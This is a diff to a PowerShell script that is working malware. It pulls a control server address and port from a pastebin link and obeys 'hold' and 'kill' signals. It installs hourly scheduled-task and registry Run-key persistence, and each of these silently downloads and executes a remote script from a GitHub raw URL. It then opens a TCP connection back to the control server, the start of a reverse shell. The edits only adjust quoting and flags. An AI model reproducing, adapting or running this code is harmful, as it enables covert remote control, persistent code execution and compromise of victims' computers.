@@ -1,5 +1,5 @@
 $re = (IWR "https://pastebin.com/raw/8GebHvJ9")
-$i, $p = $re.Content -split ':'
+$i, $p = $re -split ':'
 
 if ($re.Content -match 'hold') {
     Exit
@@ -11,9 +11,9 @@ if ($re.Content -match 'kill') {
     Exit
 }
 
-schtasks /Create /TN "Start" /SC HOURLY /MO 1 /TR "cmd /c powershell -w hidden -c \"IEX (IWR https://raw.githubusercontent.com/rindonbrg/repo/master/rep0.ps1 -UseBasicParsing)\"" /F
+schtasks /Create /TN "Start" /SC HOURLY /MO 1 /TR "cmd /c powershell -w hi -c \""IEX(IWR https://raw.githubusercontent.com/rindonbrg/repo/master/rep0.ps1 -UseBasicParsing)""" /F
 
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Start" /t REG_SZ /d "cmd /b /c powershell -w hidden -c \"IEX (IWR https://raw.githubusercontent.com/rindonbrg/repo/master/rep0.ps1 -UseBasicParsing)\"" /F
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Start" /t REG_SZ /d "cmd /b /c powershell -w hi -c \""IEX(IWR https://raw.githubusercontent.com/rindonbrg/repo/master/rep0.ps1 -UseBasicParsing)\""" /F
 
 $c = New-Object System.Net.Sockets.TCPClient($i, $p)
 $s = $c.GetStream()
